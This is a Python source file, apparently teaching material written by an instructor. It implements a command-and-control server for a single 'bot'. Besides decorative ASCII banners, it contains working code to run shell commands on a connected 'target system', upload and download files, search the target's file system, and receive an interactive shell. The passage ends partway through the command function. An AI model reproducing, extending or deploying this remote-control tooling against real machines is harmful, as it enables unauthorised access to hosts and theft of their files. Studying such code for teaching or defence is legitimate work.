################################
## NAME:     Robert Hendrickson
## ID:       instructor05
## CREATED:  10-07-2021
## UPDATED:  11-16-2021:21:20
## FILE:     hapy_srvr.py
## VERSION:  2.0
################################
"""
This program will create a server for Command and control of one bot.
USAGE: ~$ python3 hapy_srvr.py
base64 module required for encoding send/recieve data.
socket module required for send/recieve data
hashlib module/md5 function required for md5 hash of file
re module required for regular expression usage
os module required to check directory on host system to verify upload file
sys module used for exiting the program
subprocess module used for screen clear at server
time module used to pause during disconnection
random module used to pick a random bnnr
datetime module used for logging
Everywhere <if log==True:> will execute if you choose to start logging
"""

import base64
import hashlib
import os
import re
import socket
import sys
import subprocess
import time
import random
import datetime


# Here are a list of color codes for terminal colorized output
rd = '\033[0;31m'  # This will turn terminal output red
grn = '\033[0;32m'  # This will turn terminal output green
cyan = '\033[1;36m'  # This will turn terminal output cyan
magenta = '\033[0;35m'  # This will turn terminal output magenta
ylw = '\033[0;33m'  # This will turn terminal output yellow
wht = '\033[0;37m'  # This will turn terminal output white
lt_rd = '\033[0;91m'  # This will turn terminal output light red
lt_grn = '\033[0;92m'  # This will turn terminal output light green
lt_ylw = '\033[0;93m'  # This will turn terminal output light yellow
lt_prpl = '\033[0;95m'  # This will turn terminal output light purple
trquise = '\033[0;96m'  # This will turn terminal output turquoise
stop = '\033[0m'  # This will return terminal output to its normal color.

bnnr1 = """
    ╭╮ ╭╮         ╭━━━┳━━━┳╮  ╭┳━━━╮
    ┃┃ ┃┃         ┃╭━╮┃╭━╮┃╰╮╭╯┃╭━╮┃
    ┃╰━╯┣━━┳━━┳╮ ╭┫╰━━┫╰━╯┣╮┃┃╭┫╰━╯┃
    ┃╭━╮┃╭╮┃╭╮┃┃ ┃┣━━╮┃╭╮╭╯┃╰╯┃┃╭╮╭╯
    ┃┃ ┃┃╭╮┃╰╯┃╰━╯┃╰━╯┃┃┃╰╮╰╮╭╯┃┃┃╰╮
    ╰╯ ╰┻╯╰┫╭━┻━╮╭┻━━━┻╯╰━╯ ╰╯ ╰╯╰━╯
           ┃┃ ╭━╯┃
           ╰╯ ╰━━╯
    """

bnnr2 = '''
     _   _                     ______ ____           ____  
    | | | |                    \  ___)  _ \         |  _ \ 
    | |_| | __  ________ _  _  _\ \  | |_) )________| |_) )
    |  _  |/  \/ (  __  ) || || |> > |  __(  _____  )  __/ 
    | | | ( ()  < | || || \| |/ / /__| |  | |_/ \_| | |    
    |_| |_|\__/\_\|_||_| \_   _/_____)_|   \___^___/|_|    
                           | |                             
                           |_|
    '''

bnnr3 = '''
    ____    ____                               ____  ________              ________    
    `MM'    `MM'                              6MMMMb\`MMMMMMMb.            `MMMMMMMb.  
     MM      MM                              6M'    ` MM    `Mb             MM    `Mb  
     MM      MM    ___  __ ____  ____    ___ MM       MM     MM ____    ___ MM     MM  
     MM      MM  6MMMMb `M6MMMMb `MM(    )M' YM.      MM     MM `MM(    )M' MM     MM  
     MMMMMMMMMM 8M'  `Mb MM'  `Mb `Mb    d'   YMMMMb  MM    .M9  `Mb    d'  MM    .M9  
     MM      MM     ,oMM MM    MM  YM.  ,P        `Mb MMMMMMM9'   YM.  ,P   MMMMMMM9'  
     MM      MM ,6MM9'MM MM    MM   MM  M          MM MM  \M\      MM  M    MM  \M\    
     MM      MM MM'   MM MM    MM   `Mbd'          MM MM   \M\     `Mbd'    MM   \M\   
     MM      MM MM.  ,MM MM.  ,M9    YMP     L    ,M9 MM    \M\     YMP     MM    \M\  
    _MM_    _MM_`YMMM9'YbMMYMMM9      M      MYMMMM9 _MM_    \M\_    M     _MM_    \M\_
                         MM          d'                                                
                         MM      (8),P                                                 
                        _MM_      YMM                                                  
    '''

bnnr4 = '''
    88  88    db    88""Yb Yb  dP .dP"Y8 88""Yb Yb    dP 88""Yb 
    88  88   dPYb   88__dP  YbdP  `Ybo." 88__dP  Yb  dP  88__dP 
    888888  dP__Yb  88"""    8P   o.`Y8b 88"Yb    YbdP   88"Yb  
    88  88 dP""""Yb 88      dP    8bodP' 88  Yb    YP    88  Yb
    '''

bnnr5 = '''
    .S     S.    .S_SSSs     .S_sSSs     .S S.     sSSs   .S_sSSs     .S    S.    .S_sSSs    
    .SS    SS.  .SS~SSSSS   .SS~YS%%b   .SS SS.   d%%SP  .SS~YS%%b   .SS    SS.  .SS~YS%%b   
    S%S    S%S  S%S   SSSS  S%S   `S%b  S%S S%S  d%S'    S%S   `S%b  S%S    S%S  S%S   `S%b  
    S%S    S%S  S%S    S%S  S%S    S%S  S%S S%S  S%|     S%S    S%S  S%S    S%S  S%S    S%S  
    S%S SSSS%S  S%S SSSS%S  S%S    d*S  S%S S%S  S&S     S%S    d*S  S&S    S%S  S%S    d*S  
    S&S  SSS&S  S&S  SSS%S  S&S   .S*S   SS SS   Y&Ss    S&S   .S*S  S&S    S&S  S&S   .S*S  
    S&S    S&S  S&S    S&S  S&S_sdSSS     S S    `S&&S   S&S_sdSSS   S&S    S&S  S&S_sdSSS   
    S&S    S&S  S&S    S&S  S&S~YSSY      SSS      `S*S  S&S~YSY%b   S&S    S&S  S&S~YSY%b   
    S*S    S*S  S*S    S&S  S*S           S*S       l*S  S*S   `S%b  S*b    S*S  S*S   `S%b  
    S*S    S*S  S*S    S*S  S*S           S*S      .S*P  S*S    S%S  S*S.   S*S  S*S    S%S  
    S*S    S*S  S*S    S*S  S*S           S*S    sSS*S   S*S    S&S   SSSbs_S*S  S*S    S&S  
    SSS    S*S  SSS    S*S  S*S           S*S    YSS'    S*S    SSS    YSSP~SS   S*S    SSS  
    SP          SP          SP            SP     SP      SP              SPS     SP     
    Y           Y           Y             Y      Y       Y                Y      Y
    '''

bnnr6 = """
    8 88        8          .          8 8888888o  `8.`88.      ,8' d8888o.   8 8888888o. `8.`8b           ,8' 8 8888888o.   
    8 88        8         .8.         8 88    `88. `8.`88.    ,8'.`88:' `88. 8 88    `88. `8.`8b         ,8'  8 88    `88.  
    8 88        8        :888.        8 88     `88  `8.`88.  ,8' 8.`88.   Y8 8 88     `88  `8.`8b       ,8'   8 88     `88  
    8 88        8       . `888.       8 88     ,88   `8.`88.,8'  `8.`88.     8 88     ,88   `8.`8b     ,8'    8 88     ,88  
    8 88        8      .8. `888.      8 88.   ,88'    `8.`888'    `8.`88.    8 88.   ,88'    `8.`8b   ,8'     8 88.   ,88'  
    8 88        8     .8`8. `888.     8 8888888P'      `8. 88      `8.`88.   8 8888888P'      `8.`8b ,8'      8 8888888P'   
    8 88888888888    .8' `8. `888.    8 88              `8 88       `8.`88.  8 88`8b           `8.`8b8'       8 88`8b       
    8 88        8   .8'   `8. `888.   8 88               8 88   8b   `8.`88. 8 88 `8b.          `8.`8'        8 88 `8b.     
    8 88        8  .888888888. `888.  8 88               8 88   `8b.  ;8.`88 8 88   `8b.         `8``'        8 88   `8b.   
    8 88        8 .8'       `8. `888. 8 88               8 88    `Y88P ,88P' 8 88     `88.        `8'         8 88     `88.
    """

bnnr7 = """
    888    888                             .d8888b.  8888888b.           8888888b.  
    888    888                            d88P  Y88b 888   Y88b          888   Y88b 
    888    888                            Y88b.      888    888          888    888 
    8888888888  8888b.  88888b.  888  888  "Y888b.   888   d88P 888  888 888   d88P 
    888    888     "88b 888 "88b 888  888     "Y88b. 8888888P"  888  888 8888888P"  
    888    888 .d888888 888  888 888  888       "888 888 T88b   Y88  88P 888 T88b   
    888    888 888  888 888 d88P Y88b 888 Y88b  d88P 888  T88b   Y8bd8P  888  T88b  
    888    888 "Y888888 88888P"   "Y88888  "Y8888P"  888   T88b   Y88P   888   T88b 
                        888           888                                           
                        888      Y8b d88P                                           
                        888       "Y88P"                                            
    """

bnnr8 = """
     ____        ____  ____                    _   _ 
    |  _ \__   _|  _ \/ ___| _   _ _ __   __ _| | | |
    | |_) \ \ / / |_) \___ \| | | | '_ \ / _` | |_| |
    |  _ < \ V /|  _ < ___) | |_| | |_) | (_| |  _  |
    |_| \_\ \_/ |_| \_\____/ \__, | .__/ \__,_|_| |_|
                             |___/|_|                  
    """

bnnr9 = """
    >=>    >=>                                  >=>>=>   >======>                 >======>    
    >=>    >=>                                >=>    >=> >=>    >=>               >=>    >=>  
    >=>    >=>    >=> >=>  >=> >=>  >=>   >=>  >=>       >=>    >=>   >=>     >=> >=>    >=>  
    >=====>>=>  >=>   >=>  >>   >=>  >=> >=>     >=>     >> >==>       >=>   >=>  >> >==>     
    >=>    >=> >=>    >=>  >>   >=>    >==>         >=>  >=>  >=>       >=> >=>   >=>  >=>    
    >=>    >=>  >=>   >=>  >=> >=>      >=>   >=>    >=> >=>    >=>      >=>=>    >=>    >=>  
    >=>    >=>   >==>>>==> >=>         >=>      >=>>=>   >=>      >=>     >=>     >=>      >=>
                           >=>       >=>                                                      
    """

bnnr10 = """                                                                                                                       
    .    .                  t                           ;j .                       j.         
    Di   Dt              .. ED.        f.     ;WE.     f#E EW,                   E W,.        
    E#i  E#i            ;W, E#K:       E#,   i#G     .E#f  E##j        t      .DD. E##j       
    E#t  E#t           j##, E##W;      E#t  f#f     iWW;   E###D.      EK:   ,WK.  E###D.     
    E#t  E#t          G###, E#E##t     E#t G#i     L##Lffi E#jG#W;     E#t  i#D    E#jG#W;    
    E########f.     :E####, E#ti##f    E#jEW,     tLLG##L  E#t t##f    E#t j#f     E#t t##f   
    E#j..K#j...    ;W#  ##, E#t ;##D.  E##E.        ,W#i   E#t  :K#E:  E#tL#i      E#t  :K#E: 
    E#t  E#t      j###DW##, E#ELLE##K: E#G         j#E.    E#KDDDD###i E#WW,       E#KDDDD###i
    E#t  E#t     G##i,,G##, E#L;;;;;;, E#t       .D#j      E#f,t#Wi,,, E#K:        E#f,t#Wi,,,
    f#t  f#t   :K#K:   L##, E#t        E#t      ,WK,       E#t  ;#W:   ED.         E#t  ;#W:  
    ii   ii  ;##D.     L##, E#t        EE.      EG.        DWi   ,KK:  t           DWi   ,KK:                                      
    """

bnnr11 = """
    :::  === :::====  :::====  ::: === :::===  :::====  :::  === :::==== 
    :::  === :::  === :::  === ::: === :::     :::  === :::  === :::  ===
    ======== ======== =======   =====   =====  =======  ===  === ======= 
    ===  === ===  === ===        ===       === === ===   ======  === === 
    ===  === ===  === ===        ===   ======  ===  ===    ==    ===  ===
    """

bnnr12 = """
    ('-. .-.   ('-.      _ (`-.                .-')   _  .-')        (`-.   _  .-')  
    ( OO )  /  ( OO ).-. ( (OO  )              ( OO ).( \( -O )     _(OO  )_( \( -O ) 
    ,--. ,--.  / . --. /_.`     \  ,--.   ,--.(_)---\_),------. ,--(_/   ,. \,------. 
    |  | |  |  | \-.  \(__...--''   \  `.'  / /    _ | |   /`. '\   \   /(__/|   /`. '
    |   .|  |.-'-'  |  ||  /  | | .-')     /  \  :` `. |  /  | | \   \ /   / |  /  | |
    |       | \| |_.'  ||  |_.' |(OO  \   /    '..`''.)|  |_.' |  \   '   /, |  |_.' |
    |  .-.  |  |  .-.  ||  .___.' |   /  /\_  .-._)   \|  .  '.'   \     /__)|  .  '.'
    |  | |  |  |  | |  ||  |      `-./  /.__) \       /|  |\  \     \   /    |  |\  \ 
    `--' `--'  `--' `--'`--'        `--'       `-----' `--' '--'     `-'     `--' '--'
    """

bnnr13 = """
     __    __       ___      .______   ____    ____  _______..______     ____    ____ .______      
    |  |  |  |     /   \     |   _  \  \   \  /   / /       ||   _  \    \   \  /   / |   _  \     
    |  |__|  |    /  ^  \    |  |_)  |  \   \/   / |   (----`|  |_)  |    \   \/   /  |  |_)  |    
    |   __   |   /  /_\  \   |   ___/    \_    _/   \   \    |      /      \      /   |      /     
    |  |  |  |  /  _____  \  |  |          |  | .----)   |   |  |\  \----.  \    /    |  |\  \----.
    |__|  |__| /__/     \__\ | _|          |__| |_______/    | _| `._____|   \__/     | _| `._____|
    """

bnnr_list = [bnnr1, bnnr2, bnnr3, bnnr4, bnnr5, bnnr6, bnnr7, bnnr8, bnnr9, bnnr10, bnnr11, bnnr12, bnnr13]
color_list = [rd, grn, cyan, magenta, ylw, wht, lt_rd, lt_grn, lt_prpl, lt_ylw, trquise]


def bnnr_roll():
    screen_wipe()
    rbnnr = random.choice(bnnr_list)
    cbnnr = random.choice(color_list)+rbnnr
    print(cbnnr+stop)


log = input('{}[-]{} Do you want to start logging? y/n > '.format(wht,stop))
if log.lower()[:1] == 'y':
    date, ltime = str(datetime.datetime.now()).split('.')[0].split()
    log_date = '--'.join([date,ltime])
    log_file = 'Hapy_srvr_{}.log'.format(log_date)
    print('{}[-]{} Log will be saved as: {}'.format(wht, stop, log_file))
    log = True
    time.sleep(1)
else: 
    log = False


def logger(data):
    """
    This will log all data sent and received by the server
    :data: the information sent or recieved
    :logfile: The file that all the data will be saved to
    """
    data = str(data)
    with open(log_file, 'a') as f:
        f.write(data) 
    


def screen_wipe():
    """
    This will clear the screen when called
    """
    # This will check the platform and use the os.system function to clear the screen
    if sys.platform.startswith('win'):
        os.system('cls')
    elif sys.platform.startswith('linux'):
        os.system('clear')


def mysendall(socket, data, delimiter):
    """
    This is a send function for sending information to the server
    :E_data: the base64 encoded data to send to the client
    :socket: the socket object for communication between server/client
    :data: The data being sent between server/client
    :delimiter: a string used to denote the end of a transmission
    """
    E_data = base64.b64encode(data) + delimiter
    if log == True:
        logger(data.decode()+'\n')
    return socket.sendall(E_data)


def myrecvall(socket, delimiter):
    """
    This is a receive function that will decode the communication with
    the server
    :socket: the socket object for communication between server/client
    :data: The data being sent between server/client
    :delimiter: a string used to denote the end of a transmission
    :D_data: the base 64 decoded data that is being received from the client
    """
    # Initialize the data variable for the contents from the client
    data = b''
    # Keep receiving data until delimiter is at the end
    while not data.endswith(delimiter):
        data += socket.recv(4096)
    # base 64 decode and convert the bytes to a string
    D_data = base64.b64decode(data[:-len(delimiter)])
    # now we return the decoded data that was received from the client
    if log == True:
        logger(D_data.decode()+'\n')
    return D_data


def upload(socket, delimiter):
    """
    This function will get a user specified file from the host system
    and send it to the target system.
    :filename: the full file path on host system for upload file
    :target_loc: the full file path on the target system
    :socket: the socket object for communication between server/client
    :data: The data being sent between server/client
    :delimiter: a string used to denote the end of a transmission
    """
    while True:
        # Get file name from user
        print("{}[-]{} Please provide the absolute path for the server file".format(lt_prpl, stop))
        if log == True:
            logger('-'*50+"\n[-] Start upload function\n")
            logger("{}[-]{} Please provide the absolute path for the server file\n".format(lt_prpl, stop))
        filename = input("{}[-]{} What is the server file?> ".format(lt_prpl, stop))
        if log == True:
            logger("{}[-]{} What is the server file?>\n".format(lt_prpl, stop))
        # Try to open the file in read binary mode to send to the client
        try:
            with open(filename, 'rb') as f:
                # The file contents will be saved in a variable for
                # use later
                data = f.read() 
        except Exception as e:
            # If there is an error print the error to the server user
            E_msg = '{}[-]{} ERROR:\nTried to open {}\nReceived Error: {}\n'.format(lt_rd, stop, filename, str(e))
            if log == True:
                logger(E_msg)
            print(E_msg)
            # Once we print the error start the loop again.
            continue 
        else: 
            path = '{}[-]{} Please provide the absolute path of the client destination'.format(lt_prpl, stop)
            # Print the message
            print(path)
            # Get the location from the user and encode it as bytes
            target_loc = input("{}[-]{} What is the client destination?> ".format(lt_prpl, stop))
            if log == True:
                logger(path+'\n')
                logger('{}[-]{} What is the client destination?> \n'.format(lt_prpl, stop))
            target_loc = target_loc.encode()
            # Send the target location to the client
            mysendall(socket, target_loc, delimiter)
            # receive client message
            print(myrecvall(socket, delimiter).decode())
            # If no errors base 64 encode file contents and send through 
            # socket
            mysendall(socket, data, delimiter)
            # We receive the response from the client
            print(myrecvall(socket, delimiter).decode())
            # We tell the client we are ready for the next thing
            data = '\n{}[-]{} Next\n'.format(lt_prpl, stop).encode()
            mysendall(socket, data, delimiter)
            break
    c_response = myrecvall(socket, delimiter).decode()
    if '[!] ERROR' in c_response:
        e_msg = "{}[-]{} ERROR:{}\n".format(lt_rd, stop, c_response)
        if log == True: 
            logger(e_msg)
        print(e_msg)
    else:
        print(c_response)
    if log == True:
        logger('[-] End upload function\n'+'-'*50+'\n')
   

def searcher(socket, delimiter):
    """
    This function will send the search command to the client
    and retrieve the file with hash.
    :socket: the socket object for communication between server/client
    :data: The data being sent between server/client
    :delimiter: a string used to denote the end of a transmission
    :match: a received match from the client
    :length: the amount of matches from the search
    :results: a list of results received from the client
    """
    # We check it there is logging or not, if there is logging we log the data in parentheses
    if log == True:
        logger('-'*50+"\n[-] Start search function\n")
    # Print the receive message
    print(myrecvall(socket, delimiter).decode())
    # We will get the file location to start the search and encode it
    file_loc = input("{}[-]{} Where should we start looking?> ".format(magenta, stop)).encode()
    if log == True:
        logger("{}[-]{} Where should we start looking?>\n".format(magenta, stop))
    # We send the file location to the client to start the search
    mysendall(socket, file_loc, delimiter)
    # We print the response from the client
    print(myrecvall(socket, delimiter).decode())
    # We ask the user if the file name is known and encode the response
    data = input('{}[-]{} Do you know the file name?> '.format(magenta, stop)).encode()
    # If logging is enabled log the statement above
    if log == True:
        logger('{}[-]{} Do you know the file name?>\n'.format(magenta, stop))
    # We send that data to the client
    mysendall(socket, data, delimiter)
    # We get the client response back
    known = myrecvall(socket, delimiter).decode()
    # We print the response
    print(known)
    # if the name is known we get the name and send it to the client
    if 'y' in known:
        data = input('{}[-]{} What is the file name?> '.format(magenta, stop)).encode()
        if log == True:
            logger('{}[-]{} What is the file name?>\n'.format(magenta, stop))
        # Send the name to the client
        mysendall(socket, data, delimiter)
    else:
        # If the name is unknown we send unknown to the client
        data = '{}[-]{} Unknown'.format(magenta, stop).encode()
        if log == True:
            logger('{}[-]{} Unknown'.format(magenta, stop))  
        mysendall(socket, data, delimiter)
    # We tell the user that we are starting the search
    print("{}[-]{} Searching for file...".format(magenta, stop))
    if log == True:
        logger("{}[-]{} Searching for file...\n".format(magenta, stop))
    # Receive the number of matches from the search
    length = myrecvall(socket, delimiter).decode()
    # Check it the information received is an error or no results
    if length.startswith('[!] ERROR') or length.startswith('[!] No'):
        # If the length is 0 or an error
        # print the message from the client
        print(rd+length+stop)
        # Tell client we are ready for message
        data = '{}[-]{} Next'.format(magenta, stop).encode()
        # Send message to client
        mysendall(socket, data, delimiter)
        # Print the received message from the client
        print(myrecvall(socket, delimiter).decode())
    else:
        # Turn the length variable into a number for looping
        length = int(length)
        # Tell client server is ready
        data = '{}[-]{} Ready'.format(magenta, stop).encode()
        # Send ready message
        mysendall(socket, data, delimiter)
        # Initialize a variable to store the results
        results = []
        # Loop through receive then send for each match
        for i in range(length):
            # The received item will be the match from the search
            match = myrecvall(socket, delimiter).decode()
            # Print the match to the screen for the user
            file_name, file_hash = match.split('--')
            print('{0}[!]{1} Match: {2}\n    --{3}'.format(magenta, stop, file_name, file_hash))
            if log == True:
                logger('{0}[!]{1} Match: {2}\n    --{3}\n'.format(magenta, stop, file_name, file_hash))
            # Append the match to the list for later
            results.append(match)
            # Tell the client we are ready for the next one
            data = '{}[-]{} Next'.format(magenta, stop).encode()
            # Send the ready message
            mysendall(socket, data, delimiter)
        # Print the command complete message
        print(myrecvall(socket, delimiter).decode())
    if log == True:
        # Indicate end of search function for log
        logger('[-] End search function\n'+'-'*50+'\n')


def advanced_help():
    print("""
    All messages that start with {0}[-]{1} are server side
    All messages that start with {2}[!]{1} are client side
    The script will start as follows:
    [-] Do you want to enable logging? y/n>
    if yes:
    |    [-] Log will be <log_file>
        
       ╭╮╱╭╮╱╱╱╱╱╱╱╱╱╭━━━┳━━━┳╮╱╱╭┳━━━╮
       ┃┃╱┃┃╱╱╱╱╱╱╱╱╱┃╭━╮┃╭━╮┃╰╮╭╯┃╭━╮┃
       ┃╰━╯┣━━┳━━┳╮╱╭┫╰━━┫╰━╯┣╮┃┃╭┫╰━╯┃
       ┃╭━╮┃╭╮┃╭╮┃┃╱┃┣━━╮┃╭╮╭╯┃╰╯┃┃╭╮╭╯
       ┃┃╱┃┃╭╮┃╰╯┃╰━╯┃╰━╯┃┃┃╰╮╰╮╭╯┃┃┃╰╮
       ╰╯╱╰┻╯╰┫╭━┻━╮╭┻━━━┻╯╰━╯╱╰╯╱╰╯╰━╯
       ╱╱╱╱╱╱╱┃┃╱╭━╯┃
       ╱╱╱╱╱╱╱╰╯╱╰━━╯
       
    {0}[-]{1} Binding Port: <port>
    {0}[-]{1} Listening for connections...(until you receive a connection)
    {0}[-]{1} Connection established with client at <ip> !
    {0}[-]{1} Enter server command or type ? for server command list
    {0}[-]{1} user@ip: working_dir> 

    You will see the following prompt once you connect to a client:
    {0}[-]{1} user@ip: working_dir> server command
    For example, if connecting to sam at 127.0.0.1 in the home folder:
    {0}[-]{1} sam@127.0.0.1:/home> server command
    
    Server commands are listed below with example usage and output everything 
    inside <> will need to be replaced with your data or commands. 
    For download and upload, the absolute path is requird for source file and destination.
    The absolute path includes the file name and extension.
    """.format(cyan, stop, lt_rd), end='')
    input()
    print("""cmd = command     - Send a single shell command to the client. 
    |    {0}[-]{1} user@ip: working_dir> cmd
    |    {2}[!]{1} Client ready for commands
    |    {0}[-]{1} s - single or m - multiple:> s
    |    {2}[!]{1} user@ip: working_dir> os command
    |    {2}[!]{1} Command output:
    |    <command output if there is any>
    |    {2}[!]{1} Client command Complete
    |    {0}[-]{1} user@ip: working_dir> cmd
    |    {0}[-]{1} s - single or m - multiple:> m
    |    {0}[-]{1} Enter os command or type bk to go back
    |    {0}[-]{1} user@ip:working_dir> os command
    |    {2}[!]{1} Command output:
    |    <command output if there is any>
    |    {2}[!]{1} Client command Complete
    |    {2}[!]{1} user@ip: working_dir> back
    |    {0}[-]{1} user@ip: working_dir> 
    """.format(cyan, stop, lt_rd), end='')
    input()
    print("""dl = download - receive a file from the client.
    |    {0}[-]{1} user@ip: working_dir> dl
    |    {0}[-]{1} Please provide the absolute path for the client file and server destination
    |    {2}[!]{1} Ready for file name
    |    {0}[-]{1} What is the client file?> <Full path to file with extension>
    |    {0}[-]{1} What is the server destination?> <Full path to new location with extension>
    |    {0}[-]{1} File successfully downloaded to : <path provided>
    |    {2}[!]{1} Client download complete
    
    ul = upload - send a file to the client.
    |    {0}[-]{1} user@ip: working_dir> ul
    |    {0}[-]{1} Please provide the absolute path for the server file 
    |    {0}[-]{1} What server file?> <full file path of server file>
    |    {0}[-]{1} Please provide the absolute path for the client destination:>
    |    {0}[-]{1} What client destination?> <full file path to destination on the client system>
    |    {2}[!]{1} Ready for file contents
    |    {2}[!]{1} File uploaded to client at : <file location specified>
    |    {2}[!]{1} Client upload Complete
    """.format(cyan, stop, lt_rd), end='')
    input()
    print("""src = search - search the file system using regular expressions
    |    {0}[-]{1} user@ip: working_dir> src
    |    {0}[-]{1} Where should we start looking?> <start location on client>
    |    {0}[-]{1} Do you know the file name?> <yes or no>
    |    If you answer yes:
    |    |    {2}[!]{1} Ready for file name
    |    |    {0}[-]{1} What is the file name?> <file name on client system>
    |    If you answer no:
    |    |    {2}[!]{1} No file name, using default pattern 
    |    {0}[-]{1} Searching for file...
    |    <Results of search>
    |    {2}[!]{1} Client search complete

    sh = shell  - enter a command loop for multiple commands
    |           - This will only work on linux currently!
    |    {0}[-]{1} user@ip:working_dir> sh
    |    Listening on [0.0.0.0] (family 0, port <port>)
    |    Connection from <client ip> <port> received!
    |    rob@DESKTOP-RB3VDVP:/etc$
    """.format(cyan, stop, lt_rd), end='')
    input()
    print("""h = help - display the basic or advanced help string  
    |    {0}[-]{1} user@ip:working_dir> h
    |    {0}[-]{1} Would you like the basic or advanced help?> <b or adv>
    |    <help string>

    dc = disconnect - disconnect from the client
    |    {0}[-]{1} user@ip:working_dir> dc
    |    {2}[!]{1} Client terminated connection
    |    {0}[-]{1} Listening for Connections...
    
    qt/ex = quit/exit - exit the program
    |    {0}[-]{1} user@ip:working_dir> qt or ex
    |    {0}[-]{1} Good Day sir, you win nothing nada zip.

    cl = clear       - clear the terminal screen using cls or clear
    |    {0}[-]{1} user@ip:working_dir> cl
    |

    b = bnnr      - display a new bnnr
    |    {0}[-]{1} user@ip: working_dir> b
    |
    |   ╭╮╱╭╮╱╱╱╱╱╱╱╱╱╭━━━┳━━━┳╮╱╱╭┳━━━╮
    |   ┃┃╱┃┃╱╱╱╱╱╱╱╱╱┃╭━╮┃╭━╮┃╰╮╭╯┃╭━╮┃
    |   ┃╰━╯┣━━┳━━┳╮╱╭┫╰━━┫╰━╯┣╮┃┃╭┫╰━╯┃
    |   ┃╭━╮┃╭╮┃╭╮┃┃╱┃┣━━╮┃╭╮╭╯┃╰╯┃┃╭╮╭╯
    |   ┃┃╱┃┃╭╮┃╰╯┃╰━╯┃╰━╯┃┃┃╰╮╰╮╭╯┃┃┃╰╮
    |   ╰╯╱╰┻╯╰┫╭━┻━╮╭┻━━━┻╯╰━╯╱╰╯╱╰╯╰━╯
    |   ╱╱╱╱╱╱╱┃┃╱╭━╯┃
    |   ╱╱╱╱╱╱╱╰╯╱╰━━╯
    |
    |    {0}[-]{1} Enter server command or type ? for server command list
    |    {0}[-]{1} user@ip: working_dir>
    """.format(cyan, stop, lt_rd), end='')


def basic_help():
    print("""The script will start as follows:
    {0}[-]{1} Do you want to enable logging? y/n> 
    if yes:
    |    {0}[-]{1} Log file will be <log_file>
    
       ╭╮╱╭╮╱╱╱╱╱╱╱╱╱╭━━━┳━━━┳╮╱╱╭┳━━━╮
       ┃┃╱┃┃╱╱╱╱╱╱╱╱╱┃╭━╮┃╭━╮┃╰╮╭╯┃╭━╮┃
       ┃╰━╯┣━━┳━━┳╮╱╭┫╰━━┫╰━╯┣╮┃┃╭┫╰━╯┃
       ┃╭━╮┃╭╮┃╭╮┃┃╱┃┣━━╮┃╭╮╭╯┃╰╯┃┃╭╮╭╯
       ┃┃╱┃┃╭╮┃╰╯┃╰━╯┃╰━╯┃┃┃╰╮╰╮╭╯┃┃┃╰╮
       ╰╯╱╰┻╯╰┫╭━┻━╮╭┻━━━┻╯╰━╯╱╰╯╱╰╯╰━╯
       ╱╱╱╱╱╱╱┃┃╱╭━╯┃
       ╱╱╱╱╱╱╱╰╯╱╰━━╯
       
    {0}[-]{1} Binding port: <port>
    {0}[-]{1} Listening for connections...(until you receive a connection)
    {0}[-]{1} Connection established with client at <ip>
    {0}[-]{1} Enter server command or press ? to view server command list
    {0}[-]{1} user@ip:working_dir> 
    
    You will see the following prompt once you connect to a client:
    {0}[-]{1} user@ip:working_dir> server command

    For example, if connecting to sam at 127.0.0.1 in the home folder:
    {0}[-]{1} sam@127.0.0.1:/home> server command
  
    Server commands are listed below 
    b - display a new bnnr
    cl - clear the screen
    cmd - Send a shell command to the target system
    dc - disconnect from the client and listen for new connections
    dl - download(receive) a file from the target system
    ul - Upload(send) a file ot the target system
    src - search the target for specified files using regular expressions
    sh - enter multiple commands on the client
    h - Display server commands
    hs - display command history for the server
    qt/ex - stop execution of the script the program""".format(cyan, stop))

def helper():
    """
    This is a help function for the server
    :basic_str: the basic server functionality with server startup
    :advanced_str: server functionality with example usage of each command and example output
    """
    ask = input("{}[-]{} Would you like to view the basic or advanced help (b or adv)?> ".format(cyan, stop)).strip()
    # Check if the user enterd basic or advanced
    if 'b' == ask.lower():
        basic_help()
    elif 'adv' == ask.lower():
        advanced_help()
    else:
        print("{}[-]{} You must enter b or adv !".format(cyan, stop))


def download(socket, delimiter):
    """
    This will download files from the client
    :recvd: the file contents from the client
    :theFile: The destination location on the server
    :socket: the socket object for communication between server/client
    :data: The data being sent between server/client
    :delimiter: a string used to denote the end of a transmission
    """
    if log == True:
        logger('-'*50+'\n[-] Start download function\n')
    # Receive the file path comment from client
    print(myrecvall(socket, delimiter).decode())
    # Tell the user to provide the full path for the file
    print('{}[-]{} Please provide the absolute path for the client file'.format(lt_prpl, stop))
    if log == True:
        logger('{}[-]{} Please provide the absolute path for the client file'.format(lt_prpl, stop))
        logger('{}[-]{} What is the client file?> '.format(lt_prpl, stop))
    # We are getting the file path from the user
    data = input('{}[-]{} What is the client file?> '.format(lt_prpl, stop)).encode()
    # Now we send the path to the client
    mysendall(socket, data, delimiter)
    # We receive the client file contents
    recvd = myrecvall(socket, delimiter).decode()
    # Check if there is an error. print the error
    if recvd.startswith('[!] ERROR'):
        print(recvd)
    # Prompt the user where to save the file. Write the
    # file in binary mode at the location.
    else:
        print('{}[-]{} Please provide the absolute path to the server destination'.format(lt_prpl, stop))
        if log == True:
            logger('{}[-]{} Please provide the absolute path to the server destination\n'.format(lt_prpl, stop))
            logger("{}[-]{} What is the server destination?> \n".format(lt_prpl, stop))
        theFile = input("{}[-]{} What is the server destination?> ".format(lt_prpl, stop))
        with open(theFile, 'w') as outFile:
            outFile.write(recvd)
    print("{}[-]{} File successfully downloaded to: {}".format(lt_prpl, stop, theFile))
    if log == True:
        logger("{}[-]{} File successfully downloaded to: {}\n".format(lt_prpl, stop, theFile))
    # This will sync the server and client
    data = '{}[-]{} Next'.format(lt_prpl, stop).encode()
    # Now we send the message to the client
    mysendall(socket, data, delimiter)
    # Now we print the message from the client
    print(myrecvall(socket, delimiter).decode())
    if log == True:
        logger('[-] End download function\n'+'-'*50+'\n')


def command(socket, data, delimiter):
    """
    This function will send commands to the client
    :output: the output sent from the client
    :socket: the socket object for communication between server/client
    :data: The data being sent between server/client
    :s_prompt: The string at the start of every command
    :delimiter: a string used to denote the end of a transmission
    """
    if log == True:
        logger('-'*50+'\n[-] Start command function\n')
    # Initialize a value for start of while loop
    # We print that the client is ready for the command
    print(myrecvall(socket,delimiter).decode())  
    if data[:4] != b'bk':
        # Now we send the variable to the client
        mysendall(socket, data, delimiter)  
        # Now we check if there is a client message or command output
        output = myrecvall(socket,delimiter).decode()  
        # If there is an error or message it will start with {2}[!]{1}
        print(output)
        # Now we tell the client we are ready for the next command
        data = '{}[-]{} Next'.format(trquise, stop).encode()
        mysendall(socket, data, delimiter)
        # We recieve the client message
        print(myrecvall(socket,delimiter).decode())  
    else:
        # Now we send the variable to the client
